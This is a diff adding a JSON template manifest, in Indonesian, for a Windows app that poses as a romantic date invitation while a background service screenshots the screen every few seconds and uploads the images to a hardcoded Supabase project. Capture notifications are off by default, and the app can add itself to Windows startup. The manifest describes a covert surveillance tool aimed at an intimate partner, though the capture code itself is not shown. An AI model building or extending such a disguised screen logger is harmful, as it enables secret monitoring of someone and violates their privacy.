@@ -1,0 +1,161 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "template": {
+    "id": "loveyou",
+    "name": "LoveYou Romantic App & Screenshot Logger",
+    "version": "1.0.0",
+    "description": "Template aplikasi kencan interaktif berbasis Windows (.exe) dengan native webview, tray controller, dan background screenshot sync ke Supabase.",
+    "source_path": "D:/KULIAH/KODINGAN/screenshotusingpy"
+  },
+  "build": {
+    "platform": "windows",
+    "format": "onedir",
+    "entry_point": "backend/screenshot_service.py",
+    "icon": "backend/resources/heart.ico"
+  },
+  "features_schema": [
+    {
+      "key": "auto_start",
+      "label": "Registrasi Windows Startup",
+      "description": "Mendaftarkan aplikasi ke Registry Run dan folder Startup Windows agar berjalan otomatis saat login (Opt-In).",
+      "type": "boolean",
+      "default": false
+    },
+    {
+      "key": "tray_notifications",
+      "label": "Notifikasi Balon System Tray",
+      "description": "Menampilkan notifikasi Windows setiap kali pengambilan screenshot dilakukan.",
+      "type": "boolean",
+      "default": false
+    },
+    {
+      "key": "keep_local_file",
+      "label": "Simpan Salinan Lokal",
+      "description": "Menyimpan file screenshot di harddisk lokal selain mengunggahnya ke Supabase Storage.",
+      "type": "boolean",
+      "default": false
+    },
+    {
+      "key": "emergency_uninstall_hotkey",
+      "label": "Pintasan Keyboard Nonaktifkan & Hapus Bersih",
+      "description": "Mengaktifkan kombinasi tombol keyboard (Ctrl+Shift+F12 atau Ctrl+Alt+F12) untuk menonaktifkan aplikasi, mencabut dari Startup Windows, dan membersihkan file lokal seketika.",
+      "type": "boolean",
+      "default": true
+    }
+  ],
+  "configuration_schema": [
+    {
+      "key": "supabase_url",
+      "section": "SUPABASE",
+      "label": "Supabase Project URL",
+      "description": "URL REST API Supabase tempat penyimpanan data.",
+      "type": "string",
+      "default": "https://wqjfunxfngowxwdmyzyj.supabase.co",
+      "required": true
+    },
+    {
+      "key": "supabase_key",
+      "section": "SUPABASE",
+      "label": "Supabase Publishable/Anon Key",
+      "description": "API Key publik (anon) untuk autentikasi client. Jangan gunakan service_role key!",
+      "type": "string",
+      "default": "sb_publishable_u2lBe4CRF_2XEqbkniBjbw_p0gGEXgZ",
+      "required": true
+    },
+    {
+      "key": "table_name",
+      "section": "SUPABASE",
+      "label": "Nama Tabel Log",
+      "description": "Tabel di database Supabase untuk mencatat log screenshot.",
+      "type": "string",
+      "default": "hasil_ss",
+      "required": true
+    },
+    {
+      "key": "bucket_name",
+      "section": "SUPABASE",
+      "label": "Nama Storage Bucket",
+      "description": "Storage bucket di Supabase untuk mengunggah file screenshot.",
+      "type": "string",
+      "default": "screenshots",
+      "required": true
+    },
+    {
+      "key": "interval_seconds",
+      "section": "CAPTURE",
+      "label": "Interval Screenshot (Detik)",
+      "description": "Jeda waktu antar pengambilan screenshot layar.",
+      "type": "integer",
+      "default": 3,
+      "min": 1,
+      "max": 3600,
+      "required": true
+    },
+    {
+      "key": "image_format",
+      "section": "CAPTURE",
+      "label": "Format Gambar",
+      "description": "Format kompresi screenshot (WEBP direkomendasikan untuk hasil 10-50 KB & tetap tajam).",
+      "type": "select",
+      "options": ["webp", "jpg", "png"],
+      "default": "webp",
+      "required": true
+    },
+    {
+      "key": "jpg_quality",
+      "section": "CAPTURE",
+      "label": "Kualitas Kompresi (10-100)",
+      "description": "Tingkat kualitas kompresi (75% untuk WEBP optimal di 10-50 KB).",
+      "type": "integer",
+      "default": 75,
+      "min": 10,
+      "max": 100,
+      "required": true
+    },
+    {
+      "key": "date_invitation_text",
+      "section": "CONTENT",
+      "label": "Teks Tanggal Undangan",
+      "description": "Teks jadwal kencan yang ditampilkan pada kartu pertanyaan invite.html.",
+      "type": "string",
+      "default": "SABTU, 5 DESEMBER 2026",
+      "required": false
+    },
+    {
+      "key": "date_countdown_target",
+      "section": "CONTENT",
+      "label": "Target Waktu Countdown (ISO 8601)",
+      "description": "Waktu target untuk hitung mundur di halaman yes.html (misal: 2026-12-05T12:00:00Z).",
+      "type": "string",
+      "default": "2026-12-05T12:00:00Z",
+      "required": false
+    },
+    {
+      "key": "uninstall_hotkey_combo",
+      "section": "SECURITY",
+      "label": "Kombinasi Pintasan Darurat",
+      "description": "Pilihan kombinasi tombol keyboard untuk menonaktifkan & menghapus aplikasi seketika.",
+      "type": "select",
+      "options": [
+        "Ctrl+Shift+F12",
+        "Ctrl+Alt+F12",
+        "Ctrl+Shift+Q",
+        "Ctrl+Alt+Q",
+        "Ctrl+Shift+K",
+        "Ctrl+Alt+K",
+        "Ctrl+Shift+X",
+        "Ctrl+Alt+X",
+        "Ctrl+Shift+End",
+        "Ctrl+Alt+End"
+      ],
+      "default": "Ctrl+Shift+F12",
+      "required": false
+    }
+  ],
+  "editable_files": [
+    "backend/config.ini",
+    "frontend/src/invite.html",
+    "frontend/src/yes.html",
+    "frontend/src/assets/css/style.css"
+  ]
+}
